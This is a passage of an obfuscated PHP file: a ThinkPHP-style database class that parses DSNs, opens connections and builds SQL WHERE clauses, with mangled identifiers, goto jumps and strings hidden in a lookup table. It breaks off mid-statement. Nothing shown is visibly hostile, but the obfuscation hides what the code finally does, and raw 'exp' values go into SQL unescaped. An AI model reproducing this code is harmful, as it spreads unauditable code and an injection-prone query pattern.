<?php
 goto F«Á‘àŞƒø; c‚š¿Æ†Ã•: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\x6e\x65\161" => "\x3c\x3e", "\147\x74" => "\76", "\145\147\x74" => "\76\x3d", "\154\164" => "\74", "\x65\154\x74" => "\x3c\75", "\156\157\x74\154\x69\153\x65" => "\116\117\x54\x20\114\111\x4b\105", "\x6c\151\153\x65" => "\114\111\113\x45", "\151\x6e" => "\x49\116", "\156\157\x74\151\x6e" => "\116\x4f\124\40\x49\116", "\x6e\x6f\x74\x20\x69\156" => "\x4e\x4f\124\x20\111\x4e", "\142\145\164\167\x65\145\156" => "\x42\x45\x54\127\105\105\x4e", "\156\157\164\x62\x65\164\x77\x65\x65\x6e" => "\x4e\117\124\x20\102\x45\124\x57\105\105\x4e", "\156\x6f\164\x20\x62\145\x74\167\x65\145\x6e" => "\x4e\x4f\124\40\102\x45\124\127\x45\105\116"); protected $selectSql = "\123\x45\x4c\x45\103\124\45\x44\x49\x53\x54\x49\x4e\103\x54\x25\40\x25\x46\111\x45\x4c\x44\45\x20\106\x52\117\115\40\x25\x54\x41\x42\x4c\105\x25\x25\112\117\x49\x4e\x25\45\x57\x48\105\x52\x45\45\x25\x47\x52\117\x55\x50\45\45\110\x41\126\111\116\107\x25\45\x4f\122\x44\105\x52\x25\x25\x4c\x49\x4d\111\x54\45\40\45\x55\x4e\111\x4f\x4e\45\45\103\x4f\x4d\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $B±Ä¨²Æš° = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ç][887], $B±Ä¨²Æš°); } public function factory($B›çùÃŞ›Å = '') { goto a†œ§©ÔÇ±; a†œ§©ÔÇ±: $c†Øõ©Œƒ© =& $_SERVER[ç]; $B›çùÃŞ›Å = $this->parseConfig($B›çùÃŞ›Å); if (empty($B›çùÃŞ›Å[$c†Øõ©Œƒ©[888]])) { think_exception(think_lang($c†Øõ©Œƒ©[889])); } goto B÷‡œ¹¸ƒ‚; B÷‡œ¹¸ƒ‚: $this->dbType = ucwords(strtolower($B›çùÃŞ›Å[$c†Øõ©Œƒ©[888]])); $aåÆ„‚¨ğê = $c†Øõ©Œƒ©[890] . $this->dbType; if (class_exists($aåÆ„‚¨ğê)) { $DÂ¥Öâ²­ê = new $aåÆ„‚¨ğê($B›çùÃŞ›Å); if ($c†Øõ©Œƒ©[731] != strtolower($B›çùÃŞ›Å[$c†Øõ©Œƒ©[888]])) { $DÂ¥Öâ²­ê->dbType = strtoupper($this->dbType); } else { $DÂ¥Öâ²­ê->dbType = $this->_getDsnType($B›çùÃŞ›Å[$c†Øõ©Œƒ©[843]]); } } else { think_exception(think_lang($c†Øõ©Œƒ©[891]) . $c†Øõ©Œƒ©[892] . $aåÆ„‚¨ğê); } goto Bªæ‹¿Ò; Bªæ‹¿Ò: return $DÂ¥Öâ²­ê; goto aİùœ‡ˆ¥±; aİùœ‡ˆ¥±: } public function __call($B“¶ÎÔš‡, $b”ÅŸé½–¸) { if (method_exists($this, $B“¶ÎÔš‡)) { return call_user_func_array(array($this, $B“¶ÎÔš‡), $b”ÅŸé½–¸); } } protected function _getDsnType($eó•Œ´ŒßÛ) { $d¤ÁÑâØÊ = explode($_SERVER[ç][4], $eó•Œ´ŒßÛ); $DÍòßáÎ÷ = strtoupper(trim($d¤ÁÑâØÊ[0])); return $DÍòßáÎ÷; } private function parseConfig($CèŒ»˜ÓßÖ = '') { $D’Ì‘ˆä³‘ =& $_SERVER[ç]; if (!empty($CèŒ»˜ÓßÖ) && is_string($CèŒ»˜ÓßÖ)) { $CèŒ»˜ÓßÖ = $this->parseDSN($CèŒ»˜ÓßÖ); } elseif (is_array($CèŒ»˜ÓßÖ)) { $CèŒ»˜ÓßÖ = array_change_key_case($CèŒ»˜ÓßÖ); $CèŒ»˜ÓßÖ = array($D’Ì‘ˆä³‘[888] => $CèŒ»˜ÓßÖ[$D’Ì‘ˆä³‘[730]], $D’Ì‘ˆä³‘[816] => $CèŒ»˜ÓßÖ[$D’Ì‘ˆä³‘[893]], $D’Ì‘ˆä³‘[817] => $CèŒ»˜ÓßÖ[$D’Ì‘ˆä³‘[894]], $D’Ì‘ˆä³‘[814] => $CèŒ»˜ÓßÖ[$D’Ì‘ˆä³‘[895]], $D’Ì‘ˆä³‘[815] => $CèŒ»˜ÓßÖ[$D’Ì‘ˆä³‘[896]], $D’Ì‘ˆä³‘[17] => $CèŒ»˜ÓßÖ[$D’Ì‘ˆä³‘[897]], $D’Ì‘ˆä³‘[843] => $CèŒ»˜ÓßÖ[$D’Ì‘ˆä³‘[732]], $D’Ì‘ˆä³‘[13] => isset($CèŒ»˜ÓßÖ[$D’Ì‘ˆä³‘[898]]) ? $CèŒ»˜ÓßÖ[$D’Ì‘ˆä³‘[898]] : array()); } elseif (empty($CèŒ»˜ÓßÖ)) { if (think_config($D’Ì‘ˆä³‘[899]) && $D’Ì‘ˆä³‘[731] != strtolower(think_config($D’Ì‘ˆä³‘[900]))) { $CèŒ»˜ÓßÖ = $this->parseDSN(think_config($D’Ì‘ˆä³‘[899])); } else { $CèŒ»˜ÓßÖ = array($D’Ì‘ˆä³‘[888] => think_config($D’Ì‘ˆä³‘[900]), $D’Ì‘ˆä³‘[816] => think_config($D’Ì‘ˆä³‘[901]), $D’Ì‘ˆä³‘[817] => think_config($D’Ì‘ˆä³‘[902]), $D’Ì‘ˆä³‘[814] => think_config($D’Ì‘ˆä³‘[903]), $D’Ì‘ˆä³‘[815] => think_config($D’Ì‘ˆä³‘[904]), $D’Ì‘ˆä³‘[17] => think_config($D’Ì‘ˆä³‘[242]), $D’Ì‘ˆä³‘[843] => think_config($D’Ì‘ˆä³‘[899]), $D’Ì‘ˆä³‘[13] => think_config($D’Ì‘ˆä³‘[905])); } } return $CèŒ»˜ÓßÖ; } protected function initConnect($F¦ª¨ïÆŒ“ = true) { if (1 == think_config($_SERVER[ç][18])) { $this->_linkID = $this->multiConnect($F¦ª¨ïÆŒ“); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $C÷â ‡Ğ›Æ => $bù‚à²ÀË¥) { $this->_linkID = $bù‚à²ÀË¥; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($e½«®Ş’¬ = false) { $BÏ¼³¾ñ =& $_SERVER[ç]; static $f½Ø ¥æ¨ = array(); if (empty($f½Ø ¥æ¨)) { foreach ($this->config as $EîÒã²Èóœ => $aÚ’é»Ôà¹) { $f½Ø ¥æ¨[$EîÒã²Èóœ] = explode($BÏ¼³¾ñ[47], $aÚ’é»Ôà¹); } } if (think_config($BÏ¼³¾ñ[906])) { if ($e½«®Ş’¬) { $fù—†ºğÓÎ = floor(mt_rand(0, think_config($BÏ¼³¾ñ[907]) - 1)); } else { if (is_numeric(think_config($BÏ¼³¾ñ[908]))) { $fù—†ºğÓÎ = think_config($BÏ¼³¾ñ[908]); } else { $fù—†ºğÓÎ = floor(mt_rand(think_config($BÏ¼³¾ñ[907]), count($f½Ø ¥æ¨[$BÏ¼³¾ñ[814]]) - 1)); } } } else { $fù—†ºğÓÎ = floor(mt_rand(0, count($f½Ø ¥æ¨[$BÏ¼³¾ñ[814]]) - 1)); } $Få‡—¼Œ¢ = array($BÏ¼³¾ñ[816] => isset($f½Ø ¥æ¨[$BÏ¼³¾ñ[816]][$fù—†ºğÓÎ]) ? $f½Ø ¥æ¨[$BÏ¼³¾ñ[816]][$fù—†ºğÓÎ] : $f½Ø ¥æ¨[$BÏ¼³¾ñ[816]][0], $BÏ¼³¾ñ[817] => isset($f½Ø ¥æ¨[$BÏ¼³¾ñ[817]][$fù—†ºğÓÎ]) ? $f½Ø ¥æ¨[$BÏ¼³¾ñ[817]][$fù—†ºğÓÎ] : $f½Ø ¥æ¨[$BÏ¼³¾ñ[817]][0], $BÏ¼³¾ñ[814] => isset($f½Ø ¥æ¨[$BÏ¼³¾ñ[814]][$fù—†ºğÓÎ]) ? $f½Ø ¥æ¨[$BÏ¼³¾ñ[814]][$fù—†ºğÓÎ] : $f½Ø ¥æ¨[$BÏ¼³¾ñ[814]][0], $BÏ¼³¾ñ[815] => isset($f½Ø ¥æ¨[$BÏ¼³¾ñ[815]][$fù—†ºğÓÎ]) ? $f½Ø ¥æ¨[$BÏ¼³¾ñ[815]][$fù—†ºğÓÎ] : $f½Ø ¥æ¨[$BÏ¼³¾ñ[815]][0], $BÏ¼³¾ñ[17] => isset($f½Ø ¥æ¨[$BÏ¼³¾ñ[17]][$fù—†ºğÓÎ]) ? $f½Ø ¥æ¨[$BÏ¼³¾ñ[17]][$fù—†ºğÓÎ] : $f½Ø ¥æ¨[$BÏ¼³¾ñ[17]][0], $BÏ¼³¾ñ[843] => isset($f½Ø ¥æ¨[$BÏ¼³¾ñ[843]][$fù—†ºğÓÎ]) ? $f½Ø ¥æ¨[$BÏ¼³¾ñ[843]][$fù—†ºğÓÎ] : $f½Ø ¥æ¨[$BÏ¼³¾ñ[843]][0], $BÏ¼³¾ñ[13] => isset($f½Ø ¥æ¨[$BÏ¼³¾ñ[13]][$fù—†ºğÓÎ]) ? $f½Ø ¥æ¨[$BÏ¼³¾ñ[13]][$fù—†ºğÓÎ] : $f½Ø ¥æ¨[$BÏ¼³¾ñ[13]][0]); return $this->connect($Få‡—¼Œ¢, $fù—†ºğÓÎ); } public function parseDSN($E³”ØÊ–ù) { $f‰Ã«ß“Ş– =& $_SERVER[ç]; if (empty($E³”ØÊ–ù)) { return !1; } $D”ë‰ºÉ“í = parse_url($E³”ØÊ–ù); if ($D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[174]]) { $bå­µíæ¦İ = array($f‰Ã«ß“Ş–[888] => $D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[174]], $f‰Ã«ß“Ş–[816] => isset($D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[557]]) ? $D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[557]] : $f‰Ã«ß“Ş–[33], $f‰Ã«ß“Ş–[817] => isset($D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[909]]) ? $D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[909]] : $f‰Ã«ß“Ş–[33], $f‰Ã«ß“Ş–[814] => isset($D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[175]]) ? $D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[175]] : $f‰Ã«ß“Ş–[33], $f‰Ã«ß“Ş–[815] => isset($D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[176]]) ? $D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[176]] : $f‰Ã«ß“Ş–[33], $f‰Ã«ß“Ş–[17] => isset($D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[75]]) ? substr($D”ë‰ºÉ“í[$f‰Ã«ß“Ş–[75]], 1) : $f‰Ã«ß“Ş–[33]); } else { preg_match($f‰Ã«ß“Ş–[910], trim($E³”ØÊ–ù), $C»˜¹²ßŞØ); $bå­µíæ¦İ = array($f‰Ã«ß“Ş–[888] => $C»˜¹²ßŞØ[1], $f‰Ã«ß“Ş–[816] => $C»˜¹²ßŞØ[2], $f‰Ã«ß“Ş–[817] => $C»˜¹²ßŞØ[3], $f‰Ã«ß“Ş–[814] => $C»˜¹²ßŞØ[4], $f‰Ã«ß“Ş–[815] => $C»˜¹²ßŞØ[5], $f‰Ã«ß“Ş–[17] => $C»˜¹²ßŞØ[6]); } $bå­µíæ¦İ[$f‰Ã«ß“Ş–[843]] = $f‰Ã«ß“Ş–[33]; return $bå­µíæ¦İ; } protected function debug() { $C¹éÓ¹´¹Ä =& $_SERVER[ç]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $C¹éÓ¹´¹Ä[911]; if (think_config($C¹éÓ¹´¹Ä[912])) { think_status($C¹éÓ¹´¹Ä[913]); think_trace($this->queryStr . $C¹éÓ¹´¹Ä[914] . think_status($C¹éÓ¹´¹Ä[20], $C¹éÓ¹´¹Ä[913], 6) . $C¹éÓ¹´¹Ä[915], $C¹éÓ¹´¹Ä[33], $C¹éÓ¹´¹Ä[916]); } } protected function parseLock($F¾Ë÷½¹Û = false) { $EÈ©áÓ½± =& $_SERVER[ç]; if (!$F¾Ë÷½¹Û) { return $EÈ©áÓ½±[33]; } if ($EÈ©áÓ½±[845] == $this->dbType) { return $EÈ©áÓ½±[917]; } return $EÈ©áÓ½±[918]; } protected function parseSet($b˜ñá¼ ‘) { $b–­ß¯·Æš =& $_SERVER[ç]; foreach ($b˜ñá¼ ‘ as $cæŸøİ—¶ => $e‰‰“³ÜÕš) { if (is_array($e‰‰“³ÜÕš) && $b–­ß¯·Æš[293] == $e‰‰“³ÜÕš[0]) { $Eå“‹´ï¨[] = $this->parseKey($cæŸøİ—¶) . $b–­ß¯·Æš[919] . $e‰‰“³ÜÕš[1]; } elseif (is_scalar($e‰‰“³ÜÕš) || is_null($e‰‰“³ÜÕš)) { $Eå“‹´ï¨[] = $this->parseKey($cæŸøİ—¶) . $b–­ß¯·Æš[919] . $this->parseValue($e‰‰“³ÜÕš); } } return $b–­ß¯·Æš[920] . implode($b–­ß¯·Æš[47], $Eå“‹´ï¨); } protected function bindParam($A›İ’š¬„õ, $c¬Æ¾…¤) { $this->bind[$_SERVER[ç][4] . $A›İ’š¬„õ] = $c¬Æ¾…¤; } protected function parseBind($f·àÊÕìœ) { $f·àÊÕìœ = array_merge($this->bind, $f·àÊÕìœ); $this->bind = array(); return $f·àÊÕìœ; } function parseKey(&$EŞ¥›šè­, $fÙ§´¯ïÓ‚ = true) { if ($fÙ§´¯ïÓ‚) { $EŞ¥›šè­ = $this->parseKeyCheck($EŞ¥›šè­); } return $EŞ¥›šè­; } function parseKeyCheck($eÖä„ïºŞˆ) { $BÆ…Ñ„ÉÙ =& $_SERVER[ç]; $eÖä„ïºŞˆ = trim($eÖä„ïºŞˆ); if (!preg_match($BÆ…Ñ„ÉÙ[921], $eÖä„ïºŞˆ)) { think_exception($BÆ…Ñ„ÉÙ[922] . $eÖä„ïºŞˆ); } return $eÖä„ïºŞˆ; } protected function parseValue($AÓ‹©î…¶) { $E»Ö‡§¢Õª =& $_SERVER[ç]; if (is_string($AÓ‹©î…¶)) { $AÓ‹©î…¶ = $E»Ö‡§¢Õª[884] . $this->escapeString($AÓ‹©î…¶) . $E»Ö‡§¢Õª[884]; } elseif (isset($AÓ‹©î…¶[0]) && is_string($AÓ‹©î…¶[0]) && strtolower($AÓ‹©î…¶[0]) == $E»Ö‡§¢Õª[293]) { $AÓ‹©î…¶ = $this->escapeString($AÓ‹©î…¶[1]); } elseif (is_array($AÓ‹©î…¶)) { $AÓ‹©î…¶ = array_map(array($this, $E»Ö‡§¢Õª[885]), $AÓ‹©î…¶); } elseif (is_bool($AÓ‹©î…¶)) { $AÓ‹©î…¶ = $AÓ‹©î…¶ ? $E»Ö‡§¢Õª[86] : $E»Ö‡§¢Õª[491]; } elseif (is_null($AÓ‹©î…¶)) { $AÓ‹©î…¶ = $E»Ö‡§¢Õª[102]; } return $AÓ‹©î…¶; } protected function parseField($dôÍËÔÊ„) { $C¾Š«ß£¸… =& $_SERVER[ç]; if (is_string($dôÍËÔÊ„) && strpos($dôÍËÔÊ„, $C¾Š«ß£¸…[47])) { $dôÍËÔÊ„ = explode($C¾Š«ß£¸…[47], $dôÍËÔÊ„); } if (is_array($dôÍËÔÊ„)) { $A®ğÍ×Ã„â = array(); foreach ($dôÍËÔÊ„ as $cĞ¥æğ³¹ => $b´…«ïê”) { if (!is_numeric($cĞ¥æğ³¹)) { $A®ğÍ×Ã„â[] = $this->parseKey($cĞ¥æğ³¹, !1) . $C¾Š«ß£¸…[923] . $this->parseKey($b´…«ïê”); } else { $A®ğÍ×Ã„â[] = $this->parseKey($b´…«ïê”); } } $C‰¶É®« Ú = implode($C¾Š«ß£¸…[47], $A®ğÍ×Ã„â); } elseif (is_string($dôÍËÔÊ„) && !empty($dôÍËÔÊ„)) { $C‰¶É®« Ú = $dôÍËÔÊ„; } else { $C‰¶É®« Ú = $C¾Š«ß£¸…[182]; } return $C‰¶É®« Ú; } protected function parseTable($a®¯±å„·¾) { $f¾ªÜˆ¶“Ö =& $_SERVER[ç]; if (is_array($a®¯±å„·¾)) { $DìÀà¥ğóô = array(); foreach ($a®¯±å„·¾ as $fÅ½Ğß½ğš => $D÷®¶Ÿªé) { if (!is_numeric($fÅ½Ğß½ğš)) { $DìÀà¥ğóô[] = $this->parseKey($fÅ½Ğß½ğš) . $f¾ªÜˆ¶“Ö[50] . $this->parseKey($D÷®¶Ÿªé); } else { $DìÀà¥ğóô[] = $this->parseKey($fÅ½Ğß½ğš); } } $a®¯±å„·¾ = $DìÀà¥ğóô; } elseif (is_string($a®¯±å„·¾)) { if (strstr($a®¯±å„·¾, $f¾ªÜˆ¶“Ö[50])) { return $a®¯±å„·¾; } $a®¯±å„·¾ = explode($f¾ªÜˆ¶“Ö[47], $a®¯±å„·¾); array_walk($a®¯±å„·¾, array($this, $f¾ªÜˆ¶“Ö[834])); } return $f¾ªÜˆ¶“Ö[828] . trim(implode($f¾ªÜˆ¶“Ö[924], $a®¯±å„·¾), $f¾ªÜˆ¶“Ö[380]) . $f¾ªÜˆ¶“Ö[828]; } protected function parseWhere($b³ÛŠ´Âñ) { $bÊ¥¨°˜† =& $_SERVER[ç]; $D™„«æ‚ß÷ = $bÊ¥¨°˜†[33]; if (is_string($b³ÛŠ´Âñ)) { $D™„«æ‚ß÷ = $b³ÛŠ´Âñ; } else { $A„ä„„‘È = isset($b³ÛŠ´Âñ[$bÊ¥¨°˜†[925]]) ? strtoupper($b³ÛŠ´Âñ[$bÊ¥¨°˜†[925]]) : $bÊ¥¨°˜†[33]; if (in_array($A„ä„„‘È, array($bÊ¥¨°˜†[926], $bÊ¥¨°˜†[927], $bÊ¥¨°˜†[928]))) { $A„ä„„‘È = $bÊ¥¨°˜†[50] . $A„ä„„‘È . $bÊ¥¨°˜†[50]; unset($b³ÛŠ´Âñ[$bÊ¥¨°˜†[925]]); } else { $A„ä„„‘È = $bÊ¥¨°˜†[929]; } foreach ($b³ÛŠ´Âñ as $C¥öØÖê¹§ => $båÇ†Éè¯‹) { $D™„«æ‚ß÷ .= $bÊ¥¨°˜†[273]; if (is_numeric($C¥öØÖê¹§)) { $C¥öØÖê¹§ = $bÊ¥¨°˜†[930]; } if (0 === strpos($C¥öØÖê¹§, $bÊ¥¨°˜†[70])) { $D™„«æ‚ß÷ .= $this->parseThinkWhere($C¥öØÖê¹§, $båÇ†Éè¯‹); } else { if (!preg_match($bÊ¥¨°˜†[931], trim($C¥öØÖê¹§))) { think_exception(think_lang($bÊ¥¨°˜†[932]) . $bÊ¥¨°˜†[4] . $C¥öØÖê¹§); } $dİÊŠ‚¥†¤ = is_array($båÇ†Éè¯‹) && isset($båÇ†Éè¯‹[$bÊ¥¨°˜†[933]]); $C¥öØÖê¹§ = trim($C¥öØÖê¹§); if (strpos($C¥öØÖê¹§, $bÊ¥¨°˜†[279])) { $FŞß”™íòÖ = explode($bÊ¥¨°˜†[279], $C¥öØÖê¹§); $C¾×ÚÃ = array(); foreach ($FŞß”™íòÖ as $a¡±Áª”ë” => $AìöòƒğĞ¹) { $F°ƒ‘ŸÒ‚î = $dİÊŠ‚¥†¤ ? $båÇ†Éè¯‹[$a¡±Áª”ë”] : $båÇ†Éè¯‹; $C¾×ÚÃ[] = $bÊ¥¨°˜†[256] . $this->parseWhereItem($this->parseKey($AìöòƒğĞ¹), $F°ƒ‘ŸÒ‚î) . $bÊ¥¨°˜†[833]; } $D™„«æ‚ß÷ .= implode($bÊ¥¨°˜†[934], $C¾×ÚÃ); } elseif (strpos($C¥öØÖê¹§, $bÊ¥¨°˜†[280])) { $FŞß”™íòÖ = explode($bÊ¥¨°˜†[280], $C¥öØÖê¹§); $C¾×ÚÃ = array(); foreach ($FŞß”™íòÖ as $a¡±Áª”ë” => $AìöòƒğĞ¹) { $F°ƒ‘ŸÒ‚î = $dİÊŠ‚¥†¤ ? $båÇ†Éè¯‹[$a¡±Áª”ë”] : $båÇ†Éè¯‹; $C¾×ÚÃ[] = $bÊ¥¨°˜†[256] . $this->parseWhereItem($this->parseKey($AìöòƒğĞ¹), $F°ƒ‘ŸÒ‚î) . $bÊ¥¨°˜†[833]; } $D™„«æ‚ß÷ .= implode($bÊ¥¨°˜†[929], $C¾×ÚÃ); } else { $D™„«æ‚ß÷ .= $this->parseWhereItem($this->parseKey($C¥öØÖê¹§), $båÇ†Éè¯‹); } } $D™„«æ‚ß÷ .= $bÊ¥¨°˜†[274] . $A„ä„„‘È; } $D™„«æ‚ß÷ = substr($D™„«æ‚ß÷, 0, -strlen($A„ä„„‘È)); } return empty($D™„«æ‚ß÷) ? $bÊ¥¨°˜†[33] : $bÊ¥¨°˜†[935] . $D™„«æ‚ß÷; } protected function parseWhereItem($bÁ­©¯÷ãÜ, $AøøÖ¹Œù) { $fë×ÜÑÄµê =& $_SERVER[ç]; $EÖæÊÉŸ©« = $fë×ÜÑÄµê[33]; if (is_array($AøøÖ¹Œù)) { if (is_string($AøøÖ¹Œù[0])) { $A’ôƒ†è†Å = strtolower($AøøÖ¹Œù[0]); if (in_array($AøøÖ¹Œù[0], array($fë×ÜÑÄµê[919], $fë×ÜÑÄµê[936], $fë×ÜÑÄµê[937], $fë×ÜÑÄµê[938], $fë×ÜÑÄµê[939], $fë×ÜÑÄµê[940]))) { $EÖæÊÉŸ©« .= $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[50] . $AøøÖ¹Œù[0] . $fë×ÜÑÄµê[50] . $this->parseValue($AøøÖ¹Œù[1]); } elseif (preg_match($fë×ÜÑÄµê[941], $AøøÖ¹Œù[0])) { $EÖæÊÉŸ©« .= $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[50] . $this->exp[$A’ôƒ†è†Å] . $fë×ÜÑÄµê[50] . $this->parseValue($AøøÖ¹Œù[1]); } elseif (preg_match($fë×ÜÑÄµê[942], $AøøÖ¹Œù[0])) { if (is_array($AøøÖ¹Œù[1])) { $CíŸˆä‡ÔÛ = isset($AøøÖ¹Œù[2]) ? strtoupper($AøøÖ¹Œù[2]) : $fë×ÜÑÄµê[927]; if (in_array($CíŸˆä‡ÔÛ, array($fë×ÜÑÄµê[926], $fë×ÜÑÄµê[927], $fë×ÜÑÄµê[928]))) { $f‘œ£ëˆ‹÷ = array(); foreach ($AøøÖ¹Œù[1] as $AÈ«ğïµˆ‡) { $f‘œ£ëˆ‹÷[] = $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[50] . $this->exp[$A’ôƒ†è†Å] . $fë×ÜÑÄµê[50] . $this->parseValue($AÈ«ğïµˆ‡); } $EÖæÊÉŸ©« .= $fë×ÜÑÄµê[256] . implode($fë×ÜÑÄµê[50] . $CíŸˆä‡ÔÛ . $fë×ÜÑÄµê[50], $f‘œ£ëˆ‹÷) . $fë×ÜÑÄµê[833]; } } else { $EÖæÊÉŸ©« .= $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[50] . $this->exp[$A’ôƒ†è†Å] . $fë×ÜÑÄµê[50] . $this->parseValue($AøøÖ¹Œù[1]); } } elseif ($fë×ÜÑÄµê[293] == $A’ôƒ†è†Å) { $EÖæÊÉŸ©« .= $fë×ÜÑÄµê[831] . $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[50] . $AøøÖ¹Œù[1] . $fë×ÜÑÄµê[943]; } elseif (preg_match($fë×ÜÑÄµê[944], $AøøÖ¹Œù[0])) { $EÖæÊÉŸ©« .= $AøøÖ¹Œù[0]; } elseif (preg_match($fë×ÜÑÄµê[945], $AøøÖ¹Œù[0])) { if (isset($AøøÖ¹Œù[2]) && $fë×ÜÑÄµê[293] == $AøøÖ¹Œù[2]) { $EÖæÊÉŸ©« .= $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[50] . $this->exp[$A’ôƒ†è†Å] . $fë×ÜÑÄµê[50] . $AøøÖ¹Œù[1]; } else { if (is_string($AøøÖ¹Œù[1])) { $AøøÖ¹Œù[1] = explode($fë×ÜÑÄµê[47], $AøøÖ¹Œù[1]); } $A¤µ¹¶Ú„˜ = implode($fë×ÜÑÄµê[47], $this->parseValue($AøøÖ¹Œù[1])); $EÖæÊÉŸ©« .= $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[50] . $this->exp[$A’ôƒ†è†Å] . $fë×ÜÑÄµê[831] . $A¤µ¹¶Ú„˜ . $fë×ÜÑÄµê[833]; } } elseif (preg_match($fë×ÜÑÄµê[946], $AøøÖ¹Œù[0])) { $fé¸ˆ°¾ÃÀ = is_string($AøøÖ¹Œù[1]) ? explode($fë×ÜÑÄµê[47], $AøøÖ¹Œù[1]) : $AøøÖ¹Œù[1]; $EÖæÊÉŸ©« .= $fë×ÜÑÄµê[831] . $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[50] . $this->exp[$A’ôƒ†è†Å] . $fë×ÜÑÄµê[50] . $this->parseValue($fé¸ˆ°¾ÃÀ[0]) . $fë×ÜÑÄµê[929] . $this->parseValue($fé¸ˆ°¾ÃÀ[1]) . $fë×ÜÑÄµê[274]; } else { think_exception(think_lang($fë×ÜÑÄµê[932]) . $fë×ÜÑÄµê[4] . $AøøÖ¹Œù[0]); } } else { $eŠÏÈíõ°· = count($AøøÖ¹Œù); $dŠñº»‹¸Û = $fë×ÜÑÄµê[33]; if (is_string($AøøÖ¹Œù[$eŠÏÈíõ°· - 1])) { $dŠñº»‹¸Û = isset($AøøÖ¹Œù[$eŠÏÈíõ°· - 1]) ? strtoupper($AøøÖ¹Œù[$eŠÏÈíõ°· - 1]) : $fë×ÜÑÄµê[33]; if (in_array($dŠñº»‹¸Û, array($fë×ÜÑÄµê[926], $fë×ÜÑÄµê[927], $fë×ÜÑÄµê[928]))) { $eŠÏÈíõ°· = $eŠÏÈíõ°· - 1; } } else { $dŠñº»‹¸Û = $fë×ÜÑÄµê[926]; } for ($Dã™ÂÍøõ = 0; $Dã™ÂÍøõ < $eŠÏÈíõ°·; $Dã™ÂÍøõ++) { $fé¸ˆ°¾ÃÀ = is_array($AøøÖ¹Œù[$Dã™ÂÍøõ]) ? $AøøÖ¹Œù[$Dã™ÂÍøõ][1] : $AøøÖ¹Œù[$Dã™ÂÍøõ]; if ($fë×ÜÑÄµê[293] == strtolower($AøøÖ¹Œù[$Dã™ÂÍøõ][0])) { $EÖæÊÉŸ©« .= $fë×ÜÑÄµê[256] . $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[50] . $fé¸ˆ°¾ÃÀ . $fë×ÜÑÄµê[943] . $dŠñº»‹¸Û . $fë×ÜÑÄµê[50]; } else { $a‘İÂŠåå¥ = is_array($AøøÖ¹Œù[$Dã™ÂÍøõ]) ? $this->exp[strtolower($AøøÖ¹Œù[$Dã™ÂÍøõ][0])] : $fë×ÜÑÄµê[919]; if (!$a‘İÂŠåå¥ && is_array($AøøÖ¹Œù[$Dã™ÂÍøõ]) && in_array($AøøÖ¹Œù[$Dã™ÂÍøõ][0], array($fë×ÜÑÄµê[919], $fë×ÜÑÄµê[936], $fë×ÜÑÄµê[937], $fë×ÜÑÄµê[938], $fë×ÜÑÄµê[939], $fë×ÜÑÄµê[940]))) { $a‘İÂŠåå¥ = $AøøÖ¹Œù[$Dã™ÂÍøõ][0]; } $EÖæÊÉŸ©« .= $fë×ÜÑÄµê[256] . $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[50] . $a‘İÂŠåå¥ . $fë×ÜÑÄµê[50] . $this->parseValue($fé¸ˆ°¾ÃÀ) . $fë×ÜÑÄµê[943] . $dŠñº»‹¸Û . $fë×ÜÑÄµê[50]; } } $EÖæÊÉŸ©« = substr($EÖæÊÉŸ©«, 0, -4); } } else { $EÖæÊÉŸ©« .= $bÁ­©¯÷ãÜ . $fë×ÜÑÄµê[947] . $this->parseValue($AøøÖ¹Œù); } return $EÖæÊÉŸ©«; } protected function parseThinkWhere($Bé§Á­Á™», $eˆ¾­¦•£ë) { $a“×œ™•Êˆ =& $_SERVER[ç]; $A¨Øö›¥‰æ = $a“×œ™•Êˆ[33]; switch ($Bé§Á­Á™») { case $a“×œ™•Êˆ[348]: $A¨Øö›¥‰æ = $eˆ¾­¦•£ë; break; case $a“×œ™•Êˆ[930]: $A¨Øö›¥‰æ = is_string($eˆ¾­¦•£ë) ? $eˆ¾­¦•£ë : substr($this->parseWhere($eˆ¾­¦•£ë), 6); break; case $a“×œ™•Êˆ[948]: parse_str($eˆ¾­¦•£ë, $d²ƒ«¼ø«§); if (isset($d²ƒ«¼ø«§[$a“×œ™•Êˆ[925]])) { $DÑ××ÁŒ»µ = $a“×œ™•Êˆ[50] . strtoupper($d²ƒ«¼ø«§[$a“×œ™•Êˆ[925]]) . $a“×œ™•Êˆ[50]; unset($d²ƒ«¼ø«§[$a“×œ™•Êˆ[925]]); } else { $DÑ××ÁŒ»µ = $a“×œ™•Êˆ[929]; } $Fª‡Á®èØƒ = array(); foreach ($d²ƒ«¼ø«§ as $A¾æ¸í˜» => $fø§Ş¥Ìä²) { $Fª‡Á®èØƒ[] = 